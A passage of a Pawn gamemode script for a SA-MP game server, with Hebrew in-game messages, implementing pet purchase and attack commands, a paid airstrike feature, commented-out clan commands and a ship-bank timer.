SendClientMessage(playerid, COLOR_LIGHTGREEN, "Current Gangs:");
for(new i=0; i < MAX_GANGS; i++)
{
if(gangInfo[i][0] == 1)
{
format(string, sizeof(string), "%s%s(%d) - %d members", string,gangNames[i],i,gangInfo[i][1]);
x++;
if(x > 2)
{
SendClientMessage(playerid, red, string);
x = 0;
format(string, sizeof(string), " ");
}
else
{
format(string, sizeof(string), "%s, ", string);
}
}
}
if(x <= 2 && x > 0) {
string[strlen(string)-2] = '.';
SendClientMessage(playerid, red, string);
}
return 1;
}




//------------
//Lotto



//----------- [Pets System] ---------

if(strcmp(cmd, "/buytor", true) == 0)
{
if (PlayerInfo[playerid][Level] < 3) return Messagelevel (playerid, 3);

if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,red,".אנא צא מהרכב לביצוע פקודה זאת");
if(PlayerInfo[playerid][Tor] ==1) return SendClientMessage(playerid,red,".יש לך כבר צב");
if(GetPlayerMoney(playerid) < 400000) return SendClientMessage(playerid, red, ".אין לך מספיק כסף");
LACY_GiveMoney(playerid,-400000);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"!קנית צב בהצלחה");
PlayerInfo[playerid][Pets] =1;
PlayerInfo[playerid][Tor] =1;
return 1;
}

if(strcmp(cmd, "/selltor", true) == 0)
{
if(PlayerInfo[playerid][Tor] ==0) return SendClientMessage(playerid,red,".אין לך את החיה שצויינה");
LACY_GiveMoney(playerid,30000);
DestroyStreamObject(sam44[playerid]);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"!מכרת את הצב שלך בהצלחה");
PlayerInfo[playerid][Tor] =0;
PlayerInfo[playerid][Pets] =0;
return 1;
}

if(strcmp(cmd, "/calltor", true) == 0)
{
if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,red,".אנא צא מהרכב לביצוע פקודה זאת");
if(ThePetsInYou[playerid] ==1) return SendClientMessage(playerid,red,".יש לך כבר חיה ביד אנא היפתר ממנה כדאי לזמן אחרת");
if(PlayerInfo[playerid][Tor] ==0) return SendClientMessage(playerid,red,".אין לך את החיה שצויינה");
if(GetPlayerMoney(playerid) < 500) return SendClientMessage(playerid, red, ".אין לך מספיק כסף");
LACY_GiveMoney(playerid,-500);
new Float:x,Float:y,Float:z;

sam44[playerid] = CreateStreamObject(1609, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 0.0000,100);
AttachStreamObjectToPlayer(sam44[playerid],playerid,x+3,y+3,z+0.6,0,0,0);

ThePetsInYou[playerid] =1;
TorYou[playerid] =1;
SendClientMessage(playerid, COLOR_LIGHTGREEN, "/ator [id/name] - לתקיפה עם החיה שלך");


return 1;
}

if(strcmp(cmd, "/backtor", true) == 0)
{
if(PlayerInfo[playerid][Tor] ==0) return SendClientMessage(playerid,WHITE,"אין לך צב בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,WHITE,"אין לך חיה בכלל");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,WHITE,".החיה לא אצלך");
SendClientMessage(playerid, red, "!החזרת את החיה שלך בהצלחה למקום");
DestroyStreamObject(sam44[playerid]);
ThePetsInYou[playerid] =0;
TorYou[playerid] =0;
return 1;
}

if(strcmp(cmd, "/AirStrike", true) == 0)
{
new Roy_Killer[256];
Roy_Killer= strtok(cmdtext, idx);
if(20 < strlen(Roy_Killer)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");
if(!strlen(Roy_Killer))
{

SendClientMessage(playerid,COLOR_WHITE,"Usage: /AirStrike [action]");
SendClientMessage(playerid,COLOR_WHITE,"/AirStrike save (3) - לשמור מיקום של מתקפה אווירית");
SendClientMessage(playerid,COLOR_WHITE,"/AirStrike as1  (3) :על מנת לבצע תקיפה בקמות טילם של 1 בצע/י ");
SendClientMessage(playerid,COLOR_WHITE,"/AirStrike as2  (5) :על מנת לבצע תקיפה בקמות טילם של 2 בצע/י ");
SendClientMessage(playerid,COLOR_WHITE,"/AirStrike as3  (9) :על מנת לבצע תקיפה בקמות טילם של 3 בצע/י ");
SendClientMessage(playerid,COLOR_WHITE,"/AirStrike lpas (3)  :על מנת להשתגר למיקום תקיפה אווירית שציינת בצע פקודה");
return 1;
}

if(strcmp(Roy_Killer,"Save",true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(PlayerInfo[playerid][AirStrikeSaved] == 1) return SendClientMessage(playerid,WHITE,"/AirStrike del :שמור, על מנת למחוק אותו בצע/י  AirStrike יש לך כבר מיקום");
if(InArea(playerid, 404.8684, 35.6969, 2102.7212, 1653.4156)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,-1867.1172 ,-2046.8510, 365.2502,189.3918)) return  SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,2147.2263,1968.2661,904.0972,816.9983)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,-1053.7112,-1515.2965,560.0065,-740.4934)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(InArea(playerid,1985.0746,1858.3486,-1347.2802,-1464.8994)) return SendClientMessage(playerid,WHITE,".לא תוכל לעשות פה התקפה אווירית");
if(GetPlayerMoney(playerid) < 2000) return SendClientMessage(playerid,WHITE,".עולה כ2000 דולר ואין לך AirStrikeשמירת מיקום של");
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,0xFF0000AA,".אתה לא יכול לשמור מתקפת אווירית בתוך אינטרור");
LACY_GiveMoney(playerid,-2000);
GetPlayerPos(playerid,airstrikex,airstrikey,airstriakez);
AirStrikeInWar[playerid] = 0;
Explodeion[playerid] = 0;
PlayerInfo[playerid][AirStrikeSaved] = 1;
PlayerInfo[playerid][xAirStrike] = airstrikex;
PlayerInfo[playerid][yAirStrike] = airstrikey;
PlayerInfo[playerid][zAirStrike] = airstriakez;
dini_IntSet(GetPlayerFile(playerid),"SaveStrika",PlayerInfo[playerid][AirStrikeSaved]);
dini_FloatSet(GetPlayerFile(playerid),"xAir",PlayerInfo[playerid][xAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"yAir",PlayerInfo[playerid][yAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"zAir",PlayerInfo[playerid][zAirStrike]);
SendClientMessage(playerid,WHITE,".(AirStrike) שמרת בהצלחה מיקום של התפקה אווירית");




return 1;
}
else if(strcmp(Roy_Killer,"as1",true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(AirStrikeInWar[playerid] == 1) return SendClientMessage(playerid,WHITE,"אנא המתן לתקוף שנית עם המתקפה אוורית. תודה");
if(PlayerInfo[playerid][AirStrikeSaved] == 0) return SendClientMessage(playerid,WHITE,".אין לך אף מיקום תקיפה אווירית שמור");
if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid,WHITE,".על רמה מספר 1 עולה כ10,000 דולר AirStrikeהפעלת ה");

DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);

LACY_GiveMoney(playerid,-10000);

AirStrikeTil[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
MoveStreamObject(AirStrikeTil[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],110);

Explodeion[playerid] = 1;
AirStrikeExplodes[playerid] = SetTimerEx("AirStrikeExplode",4900,1,"i",playerid);
SendClientMessage(playerid,COLOR_ORANGE,".תתחיל בעוד מס' שניות, אנא ברח מהמקום שציינת אותו AirStrikeמתקפת ה");
AirStrikeInWar[playerid] = 1;
return 1;
}

else if(strcmp(Roy_Killer,"as2",true) == 0)
{
if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
if(AirStrikeInWar[playerid] == 1) return SendClientMessage(playerid,WHITE,"אנא המתן לתקוף שנית עם המתקפה אוורית. תודה");
if(PlayerInfo[playerid][AirStrikeSaved] == 0) return SendClientMessage(playerid,WHITE,".אין לך אף מיקום תקיפה אווירית שמור");
if(GetPlayerMoney(playerid) < 13000) return SendClientMessage(playerid,WHITE,".על רמה מספר 2 עולה כ13,000 דולר AirStrikeהפעלת ה");

DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);

LACY_GiveMoney(playerid,-13000);

AirStrikeTil[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
AirStrikeTil2[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
MoveStreamObject(AirStrikeTil[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],110);
MoveStreamObject(AirStrikeTil2[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],87);

Explodeion[playerid] = 2;
AirStrikeExplodes[playerid] = SetTimerEx("AirStrikeExplode",4900,1,"i",playerid);
SendClientMessage(playerid,COLOR_ORANGE,".תתחיל בעוד מס' שניות, אנא ברח מהמקום שציינת אותו AirStrikeמתקפת ה");
AirStrikeInWar[playerid] = 1;
return 1;
}
else if(strcmp(Roy_Killer,"as3",true) == 0)
{
if(PlayerInfo[playerid][Level] < 9) return Messagelevel(playerid,9);
if(AirStrikeInWar[playerid] == 1) return SendClientMessage(playerid,WHITE,"אנא המתן לתקוף שנית עם המתקפה אוורית. תודה");
if(PlayerInfo[playerid][AirStrikeSaved] == 0) return SendClientMessage(playerid,WHITE,".אין לך אף מיקום תקיפה אווירית שמור");
if(GetPlayerMoney(playerid) < 15000) return SendClientMessage(playerid,WHITE,".רמה 3 עולה כ15,000 דולר AirStrikeהפעלת ה");

DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);

LACY_GiveMoney(playerid,-15000);

AirStrikeTil[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
AirStrikeTil2[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
AirStrikeTil3[playerid] = CreateStreamObject(354,airstrikex+300,airstrikey+300,airstriakez+300,0.0000, 0.0000, 0.0000,100);
MoveStreamObject(AirStrikeTil[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],110);
MoveStreamObject(AirStrikeTil2[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],87);
MoveStreamObject(AirStrikeTil3[playerid] ,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],66);

Explodeion[playerid] = 3;
AirStrikeExplodes[playerid] = SetTimerEx("AirStrikeExplode",4900,1,"i",playerid);
SendClientMessage(playerid,COLOR_ORANGE,".תתחיל בעוד מס' שניות, אנא ברח מהמקום שציינת אותו AirStrikeמתקפת ה");
AirStrikeInWar[playerid] = 1;
return 1;
}
else if(strcmp(Roy_Killer,"del",true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(PlayerInfo[playerid][AirStrikeSaved] == 0) return SendClientMessage(playerid,WHITE,".אין לך אף מיקום תקיפה אווירית שמור");

DestroyObject(AirStrikeTil[playerid]);
DestroyObject(AirStrikeTil2[playerid]);
DestroyObject(AirStrikeTil3[playerid]);

PlayerInfo[playerid][xAirStrike] = 0.0;
PlayerInfo[playerid][yAirStrike] = 0.0;
PlayerInfo[playerid][zAirStrike] = 0.0;
PlayerInfo[playerid][AirStrikeSaved] = 0;
dini_IntSet(GetPlayerFile(playerid),"SaveStrika",0);
dini_FloatSet(GetPlayerFile(playerid),"xAir",PlayerInfo[playerid][xAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"yAir",PlayerInfo[playerid][yAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"zAir",PlayerInfo[playerid][zAirStrike]);
SendClientMessage(playerid,WHITE,".בהצלחה AirStrike מחקת את המיקומים של ה");
return 1;
}
else if(strcmp(Roy_Killer,"lpas",true) == 0)
{
if(PlayerInfo[playerid][Level] < 3) return Messagelevel(playerid,3);
if(PlayerInfo[playerid][AirStrikeSaved] == 0) return SendClientMessage(playerid,WHITE,".אין לך אף מיקום תקיפה אווירית שמור");
if(GetPlayerMoney(playerid) < 600) return SendClientMessage(playerid,WHITE,".עולה כ600 דולר AirStrikeשים לב, השתגרות למיקומי ה");
LACY_GiveMoney(playerid,-600);
CreateTeleport(playerid,0,PlayerInfo[playerid][xAirStrike],PlayerInfo[playerid][yAirStrike],PlayerInfo[playerid][zAirStrike],181.1795,0);
SendClientMessage(playerid,WHITE,".שלך בהצלחה AirStrikeהשתגרת למיקומי ה");
SetPlayerInterior(playerid,0);
return 1;
}
return 1;
}



if(strcmp(cmd, "/ator", true) == 0)
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(20 < strlen(sid)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

if(PetInWar[playerid] ==1) return SendClientMessage(playerid,red,"החיה שלך בתקיפה אנא המתן מספר שניות כדאי לתקוף שנית");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,red,".החיה לא אצלך");
if(PlayerInfo[playerid][Tor] ==0) return SendClientMessage(playerid,red,"אין לך צב בכלל");
if(TorYou[playerid] ==0) return SendClientMessage(playerid, red,".הצב לא נמצא אצלך בכלל אנא זמן אותו");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,red,"אין לך חיה בכלל");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".המספר איידי שהזנת שגוי");
if(GetPlayerInterior(id) == 1 || GetPlayerInterior(id) == 6 || GetPlayerInterior(id) == 10) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerMoney(playerid) < 700) return SendClientMessage(playerid,red,".תקיפה עם החיה שלך עולה כ700 דולר");
LACY_GiveMoney(playerid,-700);
new Float:pos[3];
GetPlayerPos(id,pos[0],pos[1],pos[2]);

if(PlayerToPoint(9.0, playerid,pos[0],pos[1],pos[2]))
{
GetPlayerPos(id,pos[0],pos[1],pos[2]);
MoveStreamObject(sam44[playerid],pos[0],pos[1],pos[2],5);
DestroyStreamObject(sam44[playerid]);
new Float:x,Float:y,Float:z;

sam44[playerid] = CreateStreamObject(1609, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 0.0000,100);
AttachStreamObjectToPlayer(sam44[playerid],playerid,x+3,y+3,z+0.6,0,0,0);

PetInWar[playerid]=1;
new Float:health;
GetPlayerHealth(id, health);
SetPlayerHealth(id, health-24);
new Float:health2=health-24;
format(string, sizeof(string), ".תוקף אותך תברח לפני שיהרוג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
GetPlayerHealth(id,health);
LACY_GiveMoney(playerid,-200);
if(health2 < 1)
{
PlayerInfo[playerid][TorKills] += 1;
format(string, sizeof(string), ".תקף אותך עם החיה שלו והרג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
}
}
else
{
SendClientMessage(playerid, WHITE, "..השחקן נמצא ברדיוס רחוק מידי");
}
return 1;
}



if(strcmp(cmd, "/buyshark", true) == 0)
{
if (PlayerInfo[playerid][Level] < 5) return Messagelevel (playerid, 5);

if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,WHITE,".אנא צא מהרכב לביצוע פקודה זאת");
if(PlayerInfo[playerid][Shark] ==1) return SendClientMessage(playerid,WHITE,"/sellshark יש לך כבר כריש למכירת הכריש");
if(GetPlayerMoney(playerid) < 30000) return SendClientMessage(playerid, WHITE, "על מנת לקנות כריש אתה צריך לפחות כ30000 דולר");
LACY_GiveMoney(playerid,-30000);
SendClientMessage(playerid,red,"./callshark לקרוא לכריש שלך /help pets - קנית כריש בהצלחה , רשימת פקודות");
PlayerInfo[playerid][Pets] =1;
PlayerInfo[playerid][Shark]=1;
return 1;
}

if(strcmp(cmd, "/sellShark", true) == 0)
{
if(PlayerInfo[playerid][Shark] ==0) return SendClientMessage(playerid,WHITE,".אין לך כריש בכלל");
LACY_GiveMoney(playerid,30000);
DestroyStreamObject(sam33[playerid]);
ThePetsInYou[playerid] =0;
SharkYou[playerid] =0;
SendClientMessage(playerid, red, ".מכרת את החיה שלך בהצלחה");
PlayerInfo[playerid][Pets] =0;
PlayerInfo[playerid][Shark] =0;
return 1;
}
if(strcmp(cmd, "/callshark", true) == 0)
{
if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,WHITE,".אנא צא מהרכב לביצוע פקודה זאת");

if(ThePetsInYou[playerid] ==1) return SendClientMessage(playerid,WHITE,".יש לך כבר חיה ביד אנא היפתר ממנה כדאי לזמן אחרת");
if(PlayerInfo[playerid][Shark] ==0) return SendClientMessage(playerid,WHITE,"אין לך כריש בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,WHITE,"אין לך חיה בכלל");
if(GetPlayerMoney(playerid) < 500) return SendClientMessage(playerid, WHITE, ".זימון החיה עולה כ500 דולר");
LACY_GiveMoney(playerid,-500);
new Float:x,Float:y,Float:z;

sam33[playerid] = CreateStreamObject(1608, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 0.0000,100);
AttachStreamObjectToPlayer(sam33[playerid],playerid,x+3,y+3,z+0.6,0,0,0);

ThePetsInYou[playerid] =1;
SharkYou[playerid] =1;
SendClientMessage(playerid, red,".--- מערכת החיות זימנה אלייך את הכריש בהצלחה ---");
SendClientMessage(playerid, lblue, "!שיגרת אליך את החיה בהצלחה");
SendClientMessage(playerid, lblue, "/backShark - להחזרת החיה למקום בצע ");
SendClientMessage(playerid, lblue, "/ashark [id/name] - לתקיפה עם החיה שלך");
SendClientMessage(playerid, red,".---------");

return 1;
}

if(strcmp(cmd, "/ashark", true) == 0)
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(20 < strlen(sid)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

if(SharkYou[playerid] ==0) return SendClientMessage(playerid, red,".החיה לא נמצאת אצלך");
if(PetInWar[playerid] ==1) return SendClientMessage(playerid,red,"החיה שלך בתקיפה אנא המתן מספר שניות כדאי לתקוף שנית");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,red,".החיה לא אצלך");
if(PlayerInfo[playerid][Shark] ==0) return SendClientMessage(playerid,red,"אין לך כריש בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,red,"אין לך חיה בכלל");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".המספר איידי שהזנת שגוי");
if(GetPlayerMoney(playerid) < 700) return SendClientMessage(playerid,red,".תקיפה עם החיה שלך עולה כ700 דולר");
LACY_GiveMoney(playerid,-700);
if(GetPlayerInterior(id) == 1 || GetPlayerInterior(id) == 6 || GetPlayerInterior(id) == 10) return SendClientMessage(playerid,0xFF0000AA,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,0xFF0000AA,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
new Float:pos[3];
GetPlayerPos(id,pos[0],pos[1],pos[2]);

if(PlayerToPoint(9.0, playerid,pos[0],pos[1],pos[2]))
{
GetPlayerPos(id,pos[0],pos[1],pos[2]);
MoveStreamObject(sam33[playerid],Pos[playerid][0],Pos[playerid][1],Pos[playerid][2],6);

DestroyStreamObject(sam33[playerid]);
new Float:x,Float:y,Float:z;

sam33[playerid] = CreateStreamObject(1608, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 0.0000,100);
AttachStreamObjectToPlayer(sam33[playerid],playerid,x+3,y+3,z+0.6,0,0,0);

PetInWar[playerid]=1;
new Float:health;
GetPlayerHealth(id, health);
SetPlayerHealth(id, health-70);
new Float:health2=health-70;
format(string, sizeof(string), ".תוקף אותך תברח לפני שיהרוג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
GetPlayerHealth(id,health);
if(health2 < 1)
{
PlayerInfo[playerid][SharkKills] += 1;
format(string, sizeof(string), ".תקף אותך עם החיה שלו והרג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
}
}
else
{
SendClientMessage(playerid, WHITE, ".השחקן נמצא ברדיוס רחוק מידי");
}
return 1;
}

if(strcmp(cmd, "/backShark", true) == 0)
{
if(PlayerInfo[playerid][Shark] ==0) return SendClientMessage(playerid,WHITE,"אין לך כריש בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,WHITE,"אין לך חיה בכלל");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,WHITE,".החיה לא אצלך");
SendClientMessage(playerid, red, "!החזרת את החיה שלך בהצלחה למקום");
DestroyStreamObject(sam33[playerid]);

ThePetsInYou[playerid] =0;
SharkYou[playerid] =0;
return 1;
}



//--
/*
if(strcmp(cmdtext, "/LoD" ,true)==0)
{
if(PP[playerid] == 1) return SendClientMessage(playerid, WHITE, ".אתה במלחמה ואינך יכול להשתגר ");
new file2[] = "RoX.ini";
//new pName[24];
GetPlayerName(playerid, pName, 24);
if(fsearch(file2, pName, false)==0)
{
SendClientMessage(playerid,WHITE,"[LoD] אתה לא נמצא בקלאן");
return 1;
}
if (IsPlayerInAnyVehicle(playerid)) {
SetVehiclePos(GetPlayerVehicleID(playerid), 884.3502,-1224.8672,16.9766);
SetVehicleZAngle(GetPlayerVehicleID(playerid), 265.4424);
}
else
{
SetPlayerPos(playerid, 884.3502,-1224.8672,16.9766);
SetPlayerFacingAngle(playerid, 265.4424);
}

return 1;
}



if(!strcmp(cmd, "/iRox", true))
{
new pid, tmpp[256];
tmpp = strtok(cmdtext, idx);
if (!strlen(tmpp))return SendClientMessage(playerid, COLOR_LIGHTGREEN, "Usage: /iRox [id/name]");
pid = strval(tmpp);
if(!(IsPlayerConnected(pid)))return SendClientMessage(playerid, WHITE, ".האיידי שהזנת הינו שגוי לחלוטין");

new name[MAX_PLAYER_NAME];
GetPlayerName(playerid, name, sizeof(name));
new temp[256];
new File:fhandle;
format(temp,sizeof(temp),"%s\n",name);
fhandle = fopen("[ClanRox].ini",io_append);
fwrite(fhandle,temp);
fclose(fhandle);
dini_Set(GetPlayerFile(playerid),"Clan","RoX");
format(string,256,".לקלאן שלך %s שלחת הזמנה ל",name);
SendClientMessage(playerid,WHITE,string);
new NAMEINVITED[MAX_PLAYER_NAME];
GetPlayerName(playerid, NAMEINVITED, sizeof(NAMEINVITED));
format(string,256,".[%s] שם הקלאן %s צורפת לקלאן ע``יי",NAMEINVITED,dini_Get(GetPlayerFile(playerid),"Clan")),SendClientMessage(pid,WHITE,string);


return 1;
}
*/
if(strcmp(cmd, "/buydolphin", true) == 0)
{
if(PlayerInfo[playerid][Level] < 4) return Messagelevel (playerid, 4);
if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,red,".אנא צא מהרכב לביצוע פקודה זאת");
if(PlayerInfo[playerid][Dolp] ==1) return SendClientMessage(playerid,red,"/selldolphin יש לך כבר דולפין אחד למכירת הדולפין");
if(GetPlayerMoney(playerid) < 30000) return SendClientMessage(playerid, red,"על מנת לקנות דולפין אתה צריך לפחות 30000 דולר");
LACY_GiveMoney(playerid,-30000);
SendClientMessage(playerid,red,"./calldolphin :לקרוא לדולפין שלך /help pets - קנית דולפין בהצלחה , לפקודות דולפין");
PlayerInfo[playerid][Pets] =1;
PlayerInfo[playerid][Dolp] =1;

return 1;
}

if(strcmp(cmd, "/selldolphin", true) == 0)
{
if(PlayerInfo[playerid][Dolp] ==1) return SendClientMessage(playerid,red,".אין לך חיה בכלל");
LACY_GiveMoney(playerid,30000);
DestroyStreamObject(sam22[playerid]);
PlayerInfo[playerid][Pets] =0;
PlayerInfo[playerid][Dolp] =0;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"!מכרת את הדולפין שלך בהצלחה");
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
return 1;
}


if(strcmp(cmd, "/calldolphin", true) == 0)
{
if(IsPlayerInAnyVehicle(playerid) ) return SendClientMessage(playerid,red,".אנא צא מהרכב לביצוע פקודה זאת");
if(ThePetsInYou[playerid] ==1) return SendClientMessage(playerid,red,".יש לך כבר חיה ביד אנא היפתר ממנה כדאי לזמן אחרת");
if(PlayerInfo[playerid][Dolp] ==0) return SendClientMessage(playerid,red,".אין לך את החיה שציינת");
if(GetPlayerMoney(playerid) < 500) return SendClientMessage(playerid, WHITE, ".זימון החיה עולה כ500 דולר");
LACY_GiveMoney(playerid,-500);
new Float:x,Float:y,Float:z;

sam22[playerid] = CreateStreamObject(1607, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 135.0000,100);
AttachStreamObjectToPlayer(sam22[playerid],playerid,x+3,y+3,z+0.8,0,0,0);

ThePetsInYou[playerid] =1;
DolpYou[playerid] =1;
SendClientMessage(playerid,red, "/adolp [id/name] :לתקיפה עם החיה שלך");


return 1;
}

if(strcmp(cmd, "/adolp", true) == 0)
{
new sid[256], id;
sid = strtok(cmdtext,idx);
id = ReturnID(sid);
if(20 < strlen(sid)) return SendClientMessage(playerid,WHITE,".בלתי אפשרי להפיל את השרת שלנו");

if(DolpYou[playerid] ==0) return SendClientMessage(playerid, red,".הדולפין לא אצלך בכלל");
if(PetInWar[playerid] ==1) return SendClientMessage(playerid,red,"החיה שלך בתקיפה אנא המתן מספר שניות כדאי לתקוף שנית");
if(ThePetsInYou[playerid] ==0) return SendClientMessage(playerid,red,".החיה לא אצלך");
if(PlayerInfo[playerid][Dolp] ==0) return SendClientMessage(playerid,red,".אין לך דולפין בכלל");
if(PlayerInfo[playerid][Pets] ==0) return SendClientMessage(playerid,red,".אין לך חיה בכלל");
if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red,".המספר איידי שהזנת שגוי");
if(GetPlayerInterior(id) == 1|| GetPlayerInterior(id) == 6 || GetPlayerInterior(id) == 10) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerInterior(playerid) == 1 || GetPlayerInterior(playerid) == 6 || GetPlayerInterior(playerid) == 10) return SendClientMessage(playerid,red,".אתה לא יכול לתקוף שחקן שהוא נמצא בתוך אינטרור");
if(GetPlayerMoney(playerid) < 700) return SendClientMessage(playerid,red,".תקיפה עם החיה שלך עולה כ700 דולר");
LACY_GiveMoney(playerid,-700);
new Float:pos[3];
GetPlayerPos(id,pos[0],pos[1],pos[2]);
if(PlayerToPoint(9.0, playerid,pos[0],pos[1],pos[2]))
{
GetPlayerPos(id,pos[0],pos[1],pos[2]);
MoveStreamObject(sam22[playerid],Pos[playerid][0],Pos[playerid][1],Pos[playerid][2],6);
DestroyStreamObject(sam22[playerid]);
new Float:x,Float:y,Float:z;

sam22[playerid] = CreateStreamObject(1607, 2294.422363, 530.393738, 1.226355, 0.0000, 0.0000, 0.0000,100);
AttachStreamObjectToPlayer(sam22[playerid],playerid,x+3,y+3,z+0.6,0,0,0);

PetInWar[playerid]=1;
new Float:health;
GetPlayerHealth(id, health);
SetPlayerHealth(id, health-36);
new Float:health2=health-36;

format(string, sizeof(string), ".תוקף אותך תברח לפני שיהרוג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
GetPlayerHealth(id,health);

if(health2 < 1)
{

PlayerInfo[playerid][DolphinKills] += 1;
format(string, sizeof(string), ".תקף אותך עם החיה שלו והרג אותך ,%s השחקן",GetName(playerid)),SendClientMessage(id, red, string);
}
}
else
{
SendClientMessage(playerid, WHITE, ".השחקן נמצא ברדיוס רחוק מידי");
}
return 1;
}

if(strcmp(cmdtext, "/sbship", true)==0)
{
if(BankShipOn[playerid] == 1) return SendClientMessage(playerid,WHITE,".בנק הספינה שלך כבר מופעל");
if (PlayerInfo[playerid][Level] < 5) return Messagelevel (playerid, 5);
if(!CPS_IsPlayerInCheckpoint(playerid,Pirate)) return SendClientMessage(playerid,red,".אתה חייב להיות בנקודת ציון על מנת להשתמש בפקודה זאת");
SetTimerEx("ShipBank",10*1000,1,"i",playerid);
BankShipOn[playerid] = 1;
format(string, sizeof(string),".%d-אתה מתחיל מסכום של כ", PlayerInfo[playerid][BSHIP]);
SendClientMessage(playerid, COLOR_ORANGE, string);
SendClientMessage(playerid, COLOR_ORANGE, ">> .לא לעזוב את ספינת הבנק, אם תעזוב הבנק יופסק");
BankShipOn[playerid] = 1;
dini_IntSet(GetPlayerFile(playerid),"BSHIP",PlayerInfo[playerid][BSHIP]);
return 1;
}

if(strcmp(cmdtext, "/sbstop", true)==0)
{
if (PlayerInfo[playerid][Level] < 5) return Messagelevel (playerid, 5);
